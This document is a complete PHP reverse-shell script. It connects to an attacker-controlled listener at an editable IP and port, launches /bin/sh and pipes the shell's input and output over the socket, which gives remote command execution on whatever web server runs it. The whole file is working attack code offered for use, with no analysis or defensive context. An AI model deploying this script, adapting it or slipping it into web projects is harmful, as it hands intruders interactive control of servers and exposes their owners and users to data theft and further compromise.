<?php
$ip = "1.1.1.1"; // CHANGE LISTENER IP
$port = 4444; // CHANGE LISTENER PORT

$sock = @fsockopen($ip, $port, $errno, $errstr, 30);

if ($sock) {
    echo "Connection successful.<br>";

    $descriptorspec = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
    );

    $process = proc_open('/bin/sh', $descriptorspec, $pipes);

    if (is_resource($process)) {
        stream_set_blocking($pipes[0], false);
        stream_set_blocking($pipes[1], false);
        stream_set_blocking($pipes[2], false);

        echo "Shell process started.<br>";

        while (!feof($sock)) {
            $input = fread($sock, 1024);
            fwrite($pipes[0], $input);
            $output = fread($pipes[1], 1024);
            fwrite($sock, $output);
            $error_output = fread($pipes[2], 1024);
            fwrite($sock, $error_output);
        }

        echo "Shell process finished.<br>";

        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
    } else {
        echo "Unable to start the shell process.<br>";
    }

    fclose($sock);
} else {
    echo "Connection failed.<br>";
    echo "Error code: $errno<br>";
    echo "Error message: $errstr<br>";
}
?>
